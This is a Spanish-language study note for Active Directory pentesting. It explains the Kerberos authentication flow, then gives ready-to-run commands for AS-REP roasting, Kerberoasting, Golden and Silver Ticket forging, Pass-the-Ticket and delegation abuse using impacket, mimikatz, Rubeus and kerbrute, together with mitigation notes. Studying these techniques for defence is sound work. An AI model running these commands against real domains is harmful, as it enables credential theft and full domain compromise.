
# Índice

[[Kerberos#1.🔐 Qué es Kerberos]]
- [[Kerberos#1.1. 🎟️ Los tickets las llaves del sistema]]
- [[Kerberos#1.2. 🏛️ El KDC por dentro]]
- [[Kerberos#1.3. 🏷️ SPN — Service Principal Name]]
- [[Kerberos#1.4. 🔄 El flujo completo de autenticación]]
- [[Kerberos#1.5. 🗝️ Resumen de claves y quién las conoce]]
[[Kerberos#2. 🔐 Autenticación por Kerberos]]
[[Kerberos#3. ⚔️ Ataques Kerberos]]
- [[Kerberos#3.1. Enumeración y fuerza bruta con Kerbrute]]
- [[Kerberos#3.2. AS-REP Roasting]]
- [[Kerberos#3.3. Kerberoasting]]
- [[Kerberos#3.4. Ataques de creación de tickets]]
	- [[Kerberos#3.4.1. Golden Ticket]]
	- [[Kerberos#3.4.2. Silver Ticket]]
- [[Kerberos#3.5. Ataques de Delegación]]
	- [[Kerberos#3.5.1. Unconstrained Delegation]]
	- [[Kerberos#3.5.2. Constrained Delegation]]
	- [[Kerberos#3.5.3 Resource-Based Constrained Delegation (RBCD)]]

-----

# 1.🔐 Qué es Kerberos

> [!abstract] Resumen
> Kerberos es un **protocolo de autenticación** basado en tickets que permite implementar **Single Sign-On (SSO)** en entornos de Active Directory. En lugar de enviar la contraseña cada vez, el usuario demuestra su identidad una sola vez y recibe tickets que le abren las puertas a los distintos servicios.

**Puerto por defecto:** `88` **Cuenta de servicio:** `KRBTGT`

Kerberos funciona como un sistema SSO con tres actores bien diferenciados:

| Actor                      | Nombre técnico                  | Función                             |
| -------------------------- | ------------------------------- | ----------------------------------- |
| 👤 Usuario                 | Client                          | Quien quiere acceder a los recursos |
| 🏛️ Proveedor de identidad | KDC *(Key Distribution Center)* | Emite y valida los tickets          |
| 🖥️ Servicio               | Service Provider                | El recurso al que se quiere acceder |

---

## 1.1. 🎟️ Los tickets: las llaves del sistema

En vez de usar la contraseña repetidamente, Kerberos usa dos tipos de tickets:

> [!info]+ TGT — Ticket Granting Ticket
> El **carnet de identidad** del usuario. Demuestra quién eres ante el KDC.
> 🔐 Está cifrado con la clave de la cuenta **KRBTGT** por tanto solo lo puede leer el KDC-TGS

> [!info]+ ST — Service Ticket
> El **pase de acceso** a un servicio concreto. Lo obtienes a cambio del TGT.
> 🔐 Está Cifrado con la clave de la **cuenta que ejecuta el servicio**, por tanto solo lo puede leer el servicio de destino

*El usuario solo puede transportar los tickets, sin leerlos ni modificarlos ya que están cifrados con claves que solo poseen los servidores. Es como llevar un sobre sellado.*

---

## 1.2. 🏛️ El KDC por dentro

El KDC tiene dos componentes que trabajan en secuencia:

- **KDC-AS (Auth Service):** Se encarga dela autenticacion y emite el TGT 
- **KDC-TGS (Ticket Granting Service):** Cambia un TGT por un ST para el servicio final

---

## 1.3. 🏷️ SPN — Service Principal Name

Los servicios se identifican ante Kerberos mediante el **SPN**, un atributo de la cuenta de servicio con este formato: `SERVICIO/host:puerto`. 
- *Por ejemplo `MSSQLSvc/SQL01.dominio.local:1433`: El servicio de MSSQL se ejecuta por el puerto 1433 en el host SQL01 del dominio.local

> Cuando el usuario pide acceso a un servicio, le indica al KDC el SPN de ese servicio. El KDC busca qué cuenta tiene ese SPN y cifra el ST con su clave. Así, solo esa cuenta de servicio puede descifrar el ticket.

---

## 1.4. 🔄 El flujo completo de autenticación

El proceso son **6 mensajes** en 3 fases. La idea central es siempre la misma: el usuario demuestra que tiene la clave correcta cifrando un *timestamp*, y a cambio recibe un ticket más una clave de sesión temporal.

```
  USUARIO                  KDC-AS               KDC-TGS              SERVICIO
     │                       │                     │                     │
     │──── 1. AS-REQ ──────> │                     │                     │
     │<─── 2. AS-REP ────────│                     │                     │
     │                       │                     │                     │
     │──────────────────────── 3. TGS-REQ ────────>│                     │
     │<─────────────────────── 4. TGS-REP ─────────│                     │
     │                       │                     │                     │
     │────────────────────────────────────────────── 5. AP-REQ ─────────>│
     │<───────────────────────────────────────────── 6. AP-REP ──────────│
```

> [!example]+ Fase 1 — Autenticación inicial (AS)
> >[!example]+ 1️⃣ AS-REQ — El usuario se presenta
> >El usuario envía al **KDC-AS**:
> >- Su **nombre de usuario**
> >- Un **authenticator**: timestamp cifrado con su *client key* (derivada de su contraseña con AES o RC4)
> >
> >*El cifrado del timestamp demuestra que conoce la contraseña sin enviarla.*
>  
> > [!example]+ 2️⃣ AS-REP — El KDC responde con el TGT
> > El **KDC-AS** descifra el timestamp con la copia de la *client key* que tiene en su base de datos. Si es válido, devuelve:
> > - El **TGT** (cifrado con la clave de KRBTGT, el usuario no puede abrirlo)
> > - Una copia de la **clave de sesión `Kc.tgs`** cifrada con la *client key* del usuario
> >
> > *La `Kc.tgs` es la llave temporal para hablar con el KDC-TGS.*

> [!example]+ Fase 2 — Solicitud de ticket de servicio (TGS)
> > [!example]+ 3️⃣ TGS-REQ — El usuario pide acceso a un servicio
> > El usuario descifra `Kc.tgs` con su *client key* y envía al **KDC-TGS**:
> > - El **TGT** (que no puede leer, pero lo transporta)
> > - Un nuevo **authenticator** cifrado con `Kc.tgs`
> > - El **SPN** del servicio al que quiere acceder
>  
> > [!example]+ 4️⃣ TGS-REP — El KDC entrega el Service Ticket
> > El **KDC-TGS**:
> > 1. Descifra el TGT con la clave de KRBTGT → obtiene la identidad del usuario y `Kc.tgs`
> > 2. Verifica el authenticator y comprueba que el ticket no haya expirado
> > 3. Busca la cuenta asociada al SPN solicitado
> > 
> > Si todo es correcto, devuelve:
> > - El **ST** (cifrado con la clave del servicio destino)
>  > - Una copia de la **clave de sesión `Kc.s`** cifrada con `Kc.tgs`
>  > 
> > *La `Kc.s` es la llave temporal para hablar directamente con el servicio.*

> [!example]+ Fase 3 — Acceso al servicio (AP)
> > [!example]+ 5️⃣ AP-REQ — El usuario llama a la puerta del servicio
> > El usuario descifra `Kc.s` con `Kc.tgs` y envía al **servicio**:
> > - El **ST** (que el servicio sí puede abrir)
> > - Un nuevo **authenticator** cifrado con `Kc.s
>  
> > [!example]+ 6️⃣ AP-REP — El servicio abre la puerta *(opcional)*
> > El **servicio**:
> > 1. Descifra el ST con su propia clave → obtiene la identidad del usuario y `Kc.s`
> > 2. Descifra el authenticator con `Kc.s` y verifica la identidad y el timestamp
> > 3. ✅ Concede acceso
> >
> > El AP-REP es **opcional** y sirve para **autenticación mutua**: el servicio demuestra al usuario que también es quien dice ser.

---

## 1.5. 🗝️ Resumen de claves y quién las conoce

| Clave                           | Se usa para cifrar...                         | La tiene...              |
| ------------------------------- | --------------------------------------------- | ------------------------ |
| *Client key*                    | Authenticators del usuario, copia de `Kc.tgs` | El Usuario y el KDC-AS   |
| Clave de **KRBTGT**             | El **TGT**                                    | Solo el KDC              |
| Clave de **cuenta de servicio** | El **ST**                                     | El KDC y el Servicio     |
| `Kc.tgs` *(sesión temporal)*    | Authenticators hacia el TGS, copia de `Kc.s`  | El Usuario y el KDC-TGS  |
| `Kc.s` *(sesión temporal)*      | Authenticators hacia el servicio              | El Usuario y el Servicio |

> [!tip] La clave del diseño
> Cada clave de sesión (`Kc.tgs`, `Kc.s`) es temporal y específica para esa comunicación. Si alguien la intercepta, no sirve para nada más. Las claves permanentes (la contraseña del usuario, la clave de KRBTGT...) nunca viajan por la red.

---

# 2. 🔐 Autenticación por Kerberos

Nuestro entorno es este:

| Rol           | hostname | FDQN               | IP          |
| ------------- | -------- | ------------------ | ----------- |
| DC            | AD01     | AD01.Dominio.local | 10.10.10.01 |
| Máquina unida | AD01     | AD02.Dominio.local | 10.10.10.02 |
Por tanto estos nombres deben quedar reflejados en el archivo `/etc/hosts` para la resolución de nombres

1. **Tenemos que tener instalados los modulos de krb5** con el paquete `krb5-user` **y generar un archivo** `/etc/krb5.conf`. Esto lo podemos hacer con `nxc smb AD01.dominio.local --generate-krb5-file krb5.conf`. El archivo tendría este aspecto:

```c
[libdefaults] 
   dns_lookup_kdc = false 
   dns_lookup_realm = false 
   default_realm = DOMINIO.LOCAL 
   
[realms] 
   DOMINIO.LOCAL = { 
       kdc = AD01.DOMINIO.local
       admin_server = AD01.DOMINIO.local 
   } 
[domain_realm] 
 .dominio.local = DOMINIO.LOCAL
 dominio.local = DOMINIO.LOCAL
```

2. **Obtenemos el TGT del usuario**: con `kinit usuario@dominio.local` o con `impacket-GetTGT dominio.local/usuario:pass123`
3. **Guardamos el ticket en una variable**: llamada **KRB5CCNAME**: `export KRB5CCNAME=usuario.ccache`
4. **Listamos los tickets en memoria**: con `klist`
5. **Nos autenticamos en las herramientas**: Por ejemplo por SMB con

```
impacket-psexec dominio.local/usuario@DC.dominio.local -k -no-pass
```

- Para evitar problemas debemos sincronizar nuestra hora con la de la máquina con `sudo ntpdate <ip_dc>`

---

# 3. ⚔️ Ataques Kerberos

Los ataques contra Kerberos explotan debilidades en su diseño o mala configuración para **obtener tickets, crackearlos offline o falsificarlos** directamente. La mayoría no requieren tráfico adicional sospechoso porque abusa del propio protocolo.

```
[Qué tenemos]
    └──────────┬─ Sin credenciales ───────────▶ AS-REP Roasting (usuarios sin preauth)
               ├─ Con credenciales válidas ───▶ Kerberoasting (cuentas con SPN)
               └─ Con un Hash ───────────┬────▶ Hash KRBTGT ──────────────▶ Golden Ticket
                                         └───-▶ Hash de cuenta con SPN ───▶ Silver Ticket
```        

---

## 3.1. Enumeración y fuerza bruta con Kerbrute

Con la herramienta kerbrute podemos obtener con kerberos información valiosa:

> [!warning]+ Enumeración de usuarios
> Para la enumeración de usuarios utilizamos 
> ```
> kerbrute userenum -dc-ip <ip_dc> -d dominio.local users.txt
> ```
> - Podemos usar los usuarios que obtengamos de rpc, de una web, de algún archivo o de un diccionario como https://github.com/attackdebris/kerberos_enum_userlists

> [!error]+ Ataque
> Para obtener la copia de Kc.tgs usamos este comando. Luego rompemos este hash con john 
> ```
> kerbrute bruteuser -dc-ip <ip_dc> -d dominio.local diccionario usuario
> ```

---

## 3.2. AS-REP Roasting

En Kerberos normal, el cliente debe cifrar un timestamp con su contraseña antes de recibir nada. Esto evita que un atacante pregunte por cualquier usuario sin consecuencias. 
**Si la preautenticación está desactivada**, el KDC responde al AS-REQ de cualquiera que conozca el nombre de usuario, **sin verificar que conoce la contraseña**.

Recordemos que el AS-REP contiene dos partes:
- El **TGT** → cifrado con la clave de KRBTGT, inútil para el atacante
- La **copia de `Kc.tgs`** → cifrada con la clave derivada de la **contraseña del usuario**

El atacante extrae esa segunda parte y la **crackea offline** para recuperar la contraseña.

> [!info]+ Requisito 
> Usuarios con la **preautenticación deshabilitada** (`DONT_REQ_PREAUTH`). Es una mala configuración, no un comportamiento normal.

> [!warning]+ Config
> La configuración se puede realizar con **dsa.msc**
> `Dominio.local > Users > Usuario > Account > Account Options > Do not requiere kerberos preauthentication`

> [!error]+ Ataque
> Para obtener la copia de Kc.tgs usamos este comando. Luego rompemos este hash con john 
> ```
> Impacket-GetNPUsers dominio.local/ -dc-ip 10.10.10.10 -no-pass -usersfile users.txt -format hashcat
> ```
> 

> [!success]+ Mitigación
> Hay que comprobar que ningun usuario tenga la preautenticación desactivada
> 

---
## 3.3. Kerberoasting

Cualquier usuario autenticado puede pedir un ST para cualquier servicio del dominio. El ST está cifrado con la clave de la cuenta asociada al SPN. El KDC no comprueba si el usuario tiene permiso para usar ese servicio, solo emite el ticket.

El atacante solicita el ST legítimamente y lo **crackea offline** para recuperar la contraseña de la cuenta de servicio.

> [!info]+ Requisito
> **Credenciales válidas** de cualquier usuario del dominio + que existan cuentas con **SPN asociado**. 
> 
> ⚠️ **Si un usuario normal tiene un SPN, Kerberos lo trata como una cuenta de servicio aunque el SPN no exista**.

> [!warning]+ Config
> El peligro reside en asignarle un SPN a una cuenta de **usuario** (no de equipo ni de servicio) ya que su contraseña puede ser más débil que las quea los servicios (aleatorias y rotativas)
> - Para asignarle un SPN a un usuario es con `setspn -A test/spn usuario` luego podemos listarlo con `setspn -L usuario`

> [!error]+ Ataque
> Obtener el ST de usuarios con SPN y crackearlo
> ```
> impacket-GetUserSPNs dominio.local/usuario:pass -request
> ```

> [!success]+ Mitigación
> Los servicios deben estar gestionados por **Managed Service Accounts (MSA/gMSA)**, lo que le da contraseñas aleatorias de 120 caracteres, incrackeables en la práctica. Auditar regularmente los SPNs asignados.

---
## 3.4. Ataques de creación de tickets

### 3.4.1. Golden Ticket

El TGT está cifrado con la clave de KRBTGT. El KDC confía ciegamente en cualquier TGT que pueda descifrar con esa clave. Si el atacante tiene esa clave, puede **fabricar TGTs válidos** para pedir **STs** en nombre de cualquier usuario para cualquier servicio, incluyendo administradores o usuarios inexistentes. 

⚠️ *Por tanto esta vía suele darse en postexplotación como vía de persistencia. Este ataque da **acceso potencial a todo el dominio**, siendo el ticket mas valioso que existe en un AD. Los Golden Tickets **persisten incluso si se cambia la contraseña del usuario suplantado**, porque el KDC no verifica que el usuario exista, solo que el TGT sea válido*

> [!info]+ Requisito
> **Hash NTLM de la cuenta KRBTGT** (obtenible por ejemplo mediante **DCSync**).

> [!danger]+ Ataque desde Windows 🟦
> Subimos la herramienta mimikatz. 
> - La opción **/nowrap** permite copiar el hash en base64 de manera más comoda mientras que **/ptt** lo almacena en la memoria. Si el cifrado es rc4 se pone **/rc4:hash** pero si es aes es **/aes256:hash** o **/aes128:hash**
> ```
> .\mimikatz.exe 'kerberos::golden /user:Administrator /domain:dominio.local /sid:<domainSID> /rc4:<krbtgtNThash> /id:500 /ptt /nowrap' exit
> ```
> Rubeus utiliza opciones muy similares:
> ```
> .\Rubeus.exe golden /rc4:<krbtgtNThash> /domain:dominio.local /sid:<domainSID> /user:Administrator /ptt /ldap /nowrap
> ```

> [!danger]+ Ataque desde Linux 🐧
> Teniendo el HASH de krbtgt y el SID del dominio podemos recibir el TGT del usuario que queremos
> ```
> impacket-ticketer.py -nthash <krbtgtNThash> -domain-sid <domainSID> -domain domain.local Administrator
> ```

----------
### 3.4.2. Silver Ticket

El ST está cifrado con la clave de la cuenta que ejecuta el servicio. Si el atacante tiene esa clave, puede **fabricar STs válidos** para ese servicio concreto, sin pasar por el KDC.

A diferencia del Golden ticket, este da acceso solo al servicio comprometido pero es más sigiloso.

> [!info]+ Requisito
> **Hash NTLM de la cuenta de servicio** (obtenible por ejemplo mediante Kerberoasting u otras técnicas).

> [!danger]+ Ataque desde Windows 🟦
> Subimos la herramienta mimikatz. 
> - La opción **/nowrap** permite copiar el hash en base64 de manera más comoda mientras que **/ptt** lo almacena en la memoria. Si el cifrado es rc4 se pone **/rc4:hash** pero si es aes es **/aes256:hash** o **/aes128:hash**
> ```
> .\mimikatz.exe 'kerberos::golden /domain:dominio.local /sid:<domainSID> /rc4:<krbtgtNThash> /id:500 /user:usuario /service:servicio' exit
> ```
> Rubeus utiliza opciones muy similares:
> ```
> .\rubeus.exe asktgs /user:<USER> /rc4:<HASH> /domain:dominio.local /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd
> ```

> [!danger]+ Ataque desde Linux 🐧
> Teniendo el HASH de la cuenta y el SID del dominio podemos recibir el ST del usuario que queramos
> ```
> impacket-ticketer -dc-ip <ip> -spn CIFS/AD01.Domain.local -domain-sid <domainSID> -nthash <NThash> -domain domain.local Administrator
> ```

> [!success]+ Mitigación
> Los servicios deben estar gestionados por **gMSA**, lo que le da contraseñas aleatorias de 120 caracteres, incrackeables en la práctica. Auditar regularmente los SPNs asignados.

---
### 3.4.3. Pass the Ticket

Los tickets Kerberos se almacenan en memoria (LSASS en Windows). Si el atacante tiene acceso a la memoria de una máquina donde hay una sesión activa, puede extraer los tickets e **inyectarlos en su propia sesión** para suplantar al usuario.

> *Mientras que en PtH se usa el hash para autenticarse por NTLM. En PtT se usa directamente el ticket Kerberos, sin necesitar la contraseña ni el hash.*

> [!info]+ Requisito
> **TGT o ST robado** de la memoria de un sistema comprometido (por ejemplo con Mimikatz o Rubeus). En Linux es un archivo *.ccache* y en Windows un *.kirbi*

> [!danger]+ Ataque desde Windows 🟦
> Subimos la herramienta mimikatz para obtener los tickets y la ejecutamos:
> 1. Exportamos los tickets `sekurlsa::tickets /export' exit` . 
> 2. Filtramos el ticket que nos interesa, de un usuario privilegiado
> 3. Lo cargamos en memoria con mimikatz: `kerberos::ptt <ticket>.kirbi`
> 4. Vemos con `klist` que efectivamente funciona
> - Tambien podemos descargarlo y convertirlo a formato Linux: `impacket-ticketConverter ticket.kirbi ticket.ccache`

> [!success]+ Mitigación
> - Activar **Protected Users Security Group** (los tickets de estos usuarios no se almacenan en caché)
> - Usar **Credential Guard** para aislar LSASS
> - Minimizar sesiones de cuentas privilegiadas en máquinas no controladas

---
## 3.5. Ataques de Delegación

La delegación permite que un servicio actúe **en nombre de un usuario** frente a otro servicio de otra máquina. Fue diseñada para resolver el "Double Hop problem", haciendo que el servicio cachee las credenciales del usuario (los tickets) y los pueda enviar. Es muy útil para para arquitecturas de múltiples capas (web → BBDD, web → SMB...), pero peligrosa si está mal configurada. 

- Por ejemplo queremos que un solo usuario acceda al servicio web

Existen tres modelos, de menos a más seguro:

---

### 3.5.1. Unconstrained Delegation

Cuando un usuario se autentica contra una máquina con Unconstrained Delegation, su **TGT completo queda almacenado en esa máquina**. La máquina puede usarlo para acceder a cualquier servicio en nombre del usuario.

```
Admin                          AD02 (Unconstrained)                        AD01 (DC)
  │                                      │                                     │
  │──── se conecta por SMB ──▶ Atacante compromete AD02 ──── ST como Admin ───▶│
  │     (TGT queda en AD02)    [extrae TGT del Admin]   ◀─── acceso total ─────│
```

> [!info]+ Requisito
> Comprometer una **máquina o cuenta con Unconstrained Delegation** activada y conseguir que un usuario privilegiado se autentique contra ella. Por ejemplo la víctima usa `Test-NetConnection maquina -Port 445` y luego `dir \\maquina.dominio.local\$C`. 
> - El atacante tambien puede forzar que el DC se autentique usando el Printer-Bug (MS-RPRN)

> [!warning]+ Config
> 1. A un sistema se le activa la delegación `Set-ADAccountControl -IDentity AD02$ -TrustedForDelegation $true`
> 2. El atacante ha comprometido a un administrador local de esa máquina, `net localgroup Administrators admin /add`

> [!danger]+ Ataque desde Windows 🟦
> Con rubeus monitorizamos en la máquina los tickets hasta dar con el de algun "Domain Admin"
> ```
> .\rubeus.exe monitor /interval:7 /ptt /nowrap
> ```
> Copiamos el ticket y lo listamos con `klist` para ver si se cargó en memoria

---

### 3.5.2. Constrained Delegation

La delegación está restringida a servicios específicos, definidos en el atributo `msDS-AllowedToDelegateTo`. Funciona mediante dos extensiones:

| Extensión | Función |
|---|---|
| **S4U2Self** | La cuenta de servicio obtiene un ST *hacia sí misma* en nombre de otro usuario |
| **S4U2Proxy** | Usa ese ST como prueba para pedir un ST hacia el servicio final permitido |
Solo funciona hacia los servicios listados en `msDS-AllowedToDelegateTo`. No se puede saltar a otros servicios

```
Atacante (cuenta comprometida                              KDC              CIFS/AD01
con delegación hacia CIFS/AD01)                             │                    │
   │                                                        │                    │
   │── S4U2Self: "dame ST para mí como Administrator" ─────▶│                    │
   │◀───── ST (para la cuenta) ─────────────────────────────│                    │
   │                                                        │                    │
   │── S4U2Proxy: "dame ST para CIFS/AD01 como Admin" ─────▶│                    │
   │◀───── ST para CIFS/AD01 ───────────────────────────────│                    │
   │                                                        │                    │
   │─────────────────────────────────────────────────────────── AP-REQ ─────────▶│
```


> [!info] Requisito
> Comprometer una **cuenta con SPN y Constrained Delegation** configurada hacia un servicio concreto.

> [!warning]+ Config
> 1. Se le asigna un SPN a un usuario `setspn -A test/spn`
> 2. En **dsa.msc**: `Dominio.local > Users > Usuario > Delegation > Trust this user for delegation > Use Any authentication Protocol` y seleccionamos un servicio en una máquina (el DC), por ejemplo *cifs/AD01.dominio.local*

> [!danger]+ Ataque desde Linux 🐧
> Obtenemos el Service Ticket con
> ```
> impacket-getST dominio.local/admin:pass123 -spn cifs/AD01.dominio.local -impersonate Administrator -dc-ip <ip_DC>
> ```

---
### 3.5.3 Resource-Based Constrained Delegation (RBCD)

> [!info] Requisito
> Permiso de **escritura sobre el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`** del servicio destino (por ejemplo por `GenericWrite` o `GenericAll`).

A diferencia de los modelos anteriores, aquí **es el servicio destino quien decide** qué cuentas pueden delegar hacia él. Esto se controla desde el objeto del propio recurso, no desde la cuenta que delega.

```
  Constrained clásica:          RBCD:
  "Yo decido a dónde voy"       "Yo decido quién entra"
  
  cuenta_servicio               recurso_destino
  └── msDS-AllowedToDelegateTo  └── msDS-AllowedToActOnBehalfOf
      └── cifs/DC01                 └── cuenta_atacante
```

En un ataque, si se tiene `GenericWrite` sobre un objeto equipo (muy común en mal configuradas), se puede apuntar `msDS-AllowedToActOnBehalfOfOtherIdentity` a una cuenta controlada por el atacante y luego usar S4U2Self + S4U2Proxy para obtener un ST como cualquier usuario hacia ese equipo.

> [!tip] Mitigación general para delegación
> - Añadir cuentas sensibles al grupo **Protected Users** (no pueden ser delegadas)
> - Marcar cuentas críticas como **"La cuenta es confidencial y no se puede delegar"**
> - Auditar regularmente los atributos de delegación en el dominio
> - Limitar `GenericWrite` sobre objetos de equipo

---

## 🔗 Ver también

- [[Active Directory]]
- [[LDAP]]
